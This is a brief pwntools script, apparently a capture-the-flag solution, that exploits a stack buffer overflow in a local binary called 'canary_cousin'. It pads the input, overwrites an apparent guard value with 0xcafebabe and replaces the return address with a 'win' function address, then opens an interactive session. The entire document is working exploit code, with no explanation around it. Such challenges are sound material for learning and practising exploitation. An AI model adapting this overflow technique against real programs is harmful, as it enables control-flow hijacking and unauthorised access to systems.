from pwn import* 

p = process("./canary_cousin")

win = 0x080484cb

p.recvuntil("!!")

pay = b"A"*0x100
pay += p32(0xcafebabe)
pay += b"B"*4
pay += p32(win)

p.sendline(pay)

p.interactive()
